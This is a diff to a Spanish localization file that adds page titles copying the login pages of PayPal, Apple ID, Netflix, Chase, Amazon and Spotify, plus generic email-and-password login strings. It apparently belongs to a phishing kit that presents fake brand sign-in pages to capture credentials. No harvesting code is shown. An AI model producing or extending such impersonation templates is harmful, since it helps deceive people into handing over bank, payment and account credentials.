@@ -108,6 +108,31 @@
         "EMAIL_SENT": "[ES] A confirmation email has been sent to {{email}}.",
         "BUTTON": "[ES] Return to Dashboard"
     },
+    "TITLES": {
+        "PAYPAL": "Inicie sesión en su cuenta PayPal",
+        "APPLE": "Iniciar sesión - ID de Apple",
+        "NETFLIX": "Netflix",
+        "CHASE": "Iniciar sesión - Chase.com",
+        "AMAZON": "Iniciar sesión en Amazon",
+        "SPOTIFY": "Iniciar sesión - Spotify"
+    },
+    "LOGIN": {
+        "TITLE": "Inicie sesión en su cuenta",
+        "SUBTITLE": "Ingrese sus credenciales para continuar.",
+        "ERROR_CREDENTIALS": "Parte de su información es incorrecta.",
+        "EMAIL_LABEL": "Dirección de correo",
+        "EMAIL_PLACEHOLDER": "Correo electrónico o número de celular",
+        "PASSWORD_LABEL": "Contraseña",
+        "PASSWORD_PLACEHOLDER": "Contraseña",
+        "FORGOT": "¿Olvidó su contraseña?",
+        "REMEMBER": "Mantener sesión iniciada",
+        "LOG_IN": "Iniciar Sesión",
+        "BUTTON": "Iniciar Sesión",
+        "OR": "o",
+        "SIGN_UP": "Regístrate",
+        "SIGNUP": "Iniciar Sesión",
+        "WELCOME": "Bienvenido"
+    },
     "MODAL_LANG": {
         "TITLE": "[ES] Choose your language",
         "DESC": "[ES] We detected you are in {{country}}, but your device is set to {{deviceLang}}.",
